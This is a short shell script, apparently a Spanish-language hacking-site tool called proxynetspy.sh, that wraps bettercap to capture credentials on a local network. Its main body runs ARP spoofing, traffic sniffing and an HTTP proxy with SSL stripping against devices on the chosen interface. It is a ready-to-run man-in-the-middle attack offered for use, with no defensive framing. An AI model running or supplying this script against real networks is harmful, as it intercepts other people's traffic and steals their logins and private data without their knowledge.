
cat << "INFO"
                                       _                   
                                      | |                  
  _ __  _ __ _____  ___   _ _ __   ___| |_ ___ _ __  _   _ 
 | '_ \| '__/ _ \ \/ / | | | '_ \ / _ \ __/ __| '_ \| | | |
 | |_) | | | (_) >  <| |_| | | | |  __/ |_\__ \ |_) | |_| |
 | .__/|_|  \___/_/\_\\__, |_| |_|\___|\__|___/ .__/ \__, |
 | |                   __/ |                  | |     __/ |
 |_|                  |___/                   |_|    |___/ Beta
                    
                                 www.hackingyseguridad.com

INFO
if [ -z "$1" ]; then
        echo 
        echo "Captura credenciales con cifrados debiles, muestra el trafico web."
        echo "Requiere Bettercap release >2.9"
        echo "Uso.: sh proxynetspy.sh <interface>"
        echo 
        exit 0
fi
echo
echo
#netdiscover -i $1
bettercap -iface $1 -eval "net.probe on; ticker on "
bettercap -iface $1 -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; http.proxy on; set http.proxy.sslstrip true "
